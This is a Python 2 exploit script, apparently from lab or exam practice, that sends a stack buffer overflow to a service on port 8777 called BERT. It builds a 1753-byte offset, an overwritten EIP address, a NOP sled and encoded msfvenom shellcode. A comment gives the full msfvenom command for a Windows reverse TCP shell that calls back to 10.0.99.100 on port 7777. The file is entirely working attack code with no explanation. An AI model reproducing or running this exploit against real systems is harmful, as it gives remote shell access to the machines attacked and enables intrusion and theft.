#! /usr/bin/python2
import socket;
import sys;

ip="10.0.5.51"
port = 8777 #default BERT port
prefix = 'BERT /.:/'

offset= "A" * 1753
eip = "\x3C\x15\x50\x43"
#4350153C
#\x3C\x15\x50\x43

#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.99.100 LPORT=7777 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python
sled = "\x90" * 32

buf =  b""
buf += b"\xbb\x22\x72\x6c\xa4\xda\xca\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\xc8\x8e\x8e"
buf += b"\x51\xf0\x87\xcd\x9a\x08\x58\xb2\x13\xed\x69\xf2\x40"
buf += b"\x66\xd9\xc2\x03\x2a\xd6\xa9\x46\xde\x6d\xdf\x4e\xd1"
buf += b"\xc6\x6a\xa9\xdc\xd7\xc7\x89\x7f\x54\x1a\xde\x5f\x65"
buf += b"\xd5\x13\x9e\xa2\x08\xd9\xf2\x7b\x46\x4c\xe2\x08\x12"
buf += b"\x4d\x89\x43\xb2\xd5\x6e\x13\xb5\xf4\x21\x2f\xec\xd6"
buf += b"\xc0\xfc\x84\x5e\xda\xe1\xa1\x29\x51\xd1\x5e\xa8\xb3"
buf += b"\x2b\x9e\x07\xfa\x83\x6d\x59\x3b\x23\x8e\x2c\x35\x57"
buf += b"\x33\x37\x82\x25\xef\xb2\x10\x8d\x64\x64\xfc\x2f\xa8"
buf += b"\xf3\x77\x23\x05\x77\xdf\x20\x98\x54\x54\x5c\x11\x5b"
buf += b"\xba\xd4\x61\x78\x1e\xbc\x32\xe1\x07\x18\x94\x1e\x57"
buf += b"\xc3\x49\xbb\x1c\xee\x9e\xb6\x7f\x67\x52\xfb\x7f\x77"
buf += b"\xfc\x8c\x0c\x45\xa3\x26\x9a\xe5\x2c\xe1\x5d\x09\x07"
buf += b"\x55\xf1\xf4\xa8\xa6\xd8\x32\xfc\xf6\x72\x92\x7d\x9d"
buf += b"\x82\x1b\xa8\x32\xd2\xb3\x03\xf3\x82\x73\xf4\x9b\xc8"
buf += b"\x7b\x2b\xbb\xf3\x51\x44\x56\x0e\x32\x61\xa7\x73\xa6"
buf += b"\x1d\xa5\x73\x38\xbf\x20\x95\x2e\x2f\x65\x0e\xc7\xd6"
buf += b"\x2c\xc4\x76\x16\xfb\xa1\xb9\x9c\x08\x56\x77\x55\x64"
buf += b"\x44\xe0\x95\x33\x36\xa7\xaa\xe9\x5e\x2b\x38\x76\x9e"
buf += b"\x22\x21\x21\xc9\x63\x97\x38\x9f\x99\x8e\x92\xbd\x63"
buf += b"\x56\xdc\x05\xb8\xab\xe3\x84\x4d\x97\xc7\x96\x8b\x18"
buf += b"\x4c\xc2\x43\x4f\x1a\xbc\x25\x39\xec\x16\xfc\x96\xa6"
buf += b"\xfe\x79\xd5\x78\x78\x86\x30\x0f\x64\x37\xed\x56\x9b"
buf += b"\xf8\x79\x5f\xe4\xe4\x19\xa0\x3f\xad\x2a\xeb\x1d\x84"
buf += b"\xa2\xb2\xf4\x94\xae\x44\x23\xda\xd6\xc6\xc1\xa3\x2c"
buf += b"\xd6\xa0\xa6\x69\x50\x59\xdb\xe2\x35\x5d\x48\x02\x1c"

buffer = prefix + offset + eip + sled + buf

print("Fuzzing BERT with %s bytes " % len(buffer))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((ip,port))
s.send((buffer))
s.close()
